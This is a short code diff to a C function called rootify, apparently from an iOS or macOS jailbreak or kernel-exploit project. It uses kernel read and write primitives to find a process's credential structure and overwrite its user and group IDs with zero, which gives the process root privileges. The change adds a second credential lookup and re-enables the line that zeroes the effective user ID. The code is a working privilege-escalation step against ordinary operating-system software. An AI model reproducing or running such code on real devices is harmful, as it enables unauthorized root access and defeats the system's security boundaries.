@@ -67,6 +67,8 @@ bool rootify(pid_t pid) {
     printf("[i] kern ro @ %llx\n", ro);
     uint64_t ucred = kread64(ro + 0x20);
     printf("[i] kern ucred @ %llx\n", ucred);
+    uint64_t ucred_ = kread64(proc + off_p_ucred);
+    printf("[i] kern ucred @ %llx\n", ucred_);
     
     
     //make everything 0 without setuid(0), pretty straightforward.
@@ -74,7 +76,7 @@ bool rootify(pid_t pid) {
     kwrite32(proc + off_p_ruid, 0);
     kwrite32(proc + off_p_gid, 0);
     kwrite32(proc + off_p_rgid, 0);
-    //kwrite32(ucred + off_u_cr_uid, 0);
+    kwrite32(ucred + off_u_cr_uid, 0);
     kwrite32(ucred + off_u_cr_ruid, 0);
     kwrite32(ucred + off_u_cr_svuid, 0);
     kwrite32(ucred + off_u_cr_ngroups, 1);
